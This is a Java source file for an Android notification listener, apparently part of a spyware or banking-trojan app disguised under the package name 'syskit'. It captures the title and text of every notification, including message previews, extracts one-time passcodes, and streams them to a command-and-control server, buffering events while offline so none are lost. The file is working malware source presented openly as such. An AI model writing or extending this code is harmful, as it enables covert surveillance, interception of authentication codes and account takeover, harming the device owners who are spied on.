package com.lo.syskit;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.Deque;

/**
 * NlService — the reliable ear. NotificationListenerService sees every
 * notification before the user blinks: messages, OTP codes, previews of
 * "deleted" messages, everything. While the C2 link is up, events stream
 * straight out. While it's down, they queue in a ring buffer and drain
 * on reconnect — nothing is lost to a bad signal.
 */
public class NlService extends NotificationListenerService {

    private static final String TAG = "syskit.nl";
    private static NlService instance;
    private static volatile boolean streaming = true;

    private static final Deque<JSONObject> backlog = new ArrayDeque<>();
    private static final int BACKLOG_CAP = 100;

    public static NlService instance() { return instance; }
    public static void setStreaming(boolean on) { streaming = on; }
    public static boolean isStreaming() { return streaming; }

    /** Panel drain: take and clear the offline backlog. */
    public static synchronized JSONObject[] drainBacklog() {
        JSONObject[] out = backlog.toArray(new JSONObject[0]);
        backlog.clear();
        return out;
    }

    public static synchronized void stash(JSONObject n) {
        if (backlog.size() >= BACKLOG_CAP) backlog.pollFirst();
        backlog.addLast(n);
    }

    @Override public void onListenerConnected() {
        instance = this;
    }

    @Override public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        try {
            JSONObject n = extract(sbn);
            if (n == null) return;
            if (CoreService.linkUp() && CoreService.forward(n)) return;
            stash(n);                       // link down — queue it
        } catch (Exception e) {
            Log.w(TAG, "extract failed", e);
        }
    }

    private JSONObject extract(StatusBarNotification sbn) {
        android.os.Bundle ex = sbn.getNotification().extras;
        if (ex == null) return null;
        CharSequence title = ex.getCharSequence(
                android.app.Notification.EXTRA_TITLE);
        CharSequence text = ex.getCharSequence(
                android.app.Notification.EXTRA_TEXT);
        CharSequence big = ex.getCharSequence(
                android.app.Notification.EXTRA_BIG_TEXT);
        String body = text != null ? text.toString() : "";
        if (big != null && big.length() > body.length()) body = big.toString();
        if ((title == null || title.length() == 0) && body.length() == 0)
            return null;

        JSONObject n = new JSONObject();
        try {
            n.put("op", "notify");
            n.put("pkg", sbn.getPackageName());
            n.put("title", title == null ? "" : title.toString());
            n.put("text", body);
            n.put("posted", sbn.getPostTime());
            n.put("otp", Ops.otpIn(body));   // extracted code hint, may be ""
        } catch (Exception ignore) { return null; }
        return n;
    }
}
